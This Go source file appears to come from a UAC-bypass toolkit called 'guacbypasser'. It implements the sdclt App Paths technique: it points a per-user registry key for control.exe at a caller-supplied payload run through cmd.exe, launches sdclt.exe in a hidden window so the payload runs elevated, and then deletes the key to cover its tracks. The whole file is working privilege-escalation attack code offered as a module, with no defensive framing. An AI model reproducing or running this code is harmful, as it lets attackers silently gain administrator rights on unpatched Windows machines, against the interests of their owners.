package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	sc ".."
	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_sdcltControl(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "sdcltcontrol",
		Desc: "Bypass UAC using sdclt (app paths) and registry key manipulation",
		Id:   8,

		Type:   "Once",
		Module: "w32_nt_once_sdcltControl",

		Fixed:   true,
		FixedIn: "16215",

		Admin:   false,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE); err != nil {

		return err, inf
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}

	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err, inf
	}
	time.Sleep(time.Second)

	cmd := sc.NewCmd("start sdclt.exe")
	cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.Exec.Output(); err != nil {
		return err, inf
	}
	time.Sleep(3 * time.Second)

	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewOnceSdcltControl #add-some-info-please
func NewOnceSdcltControl(p string) (error, sc.Informer) { return w32_nt_once_sdcltControl(p) }
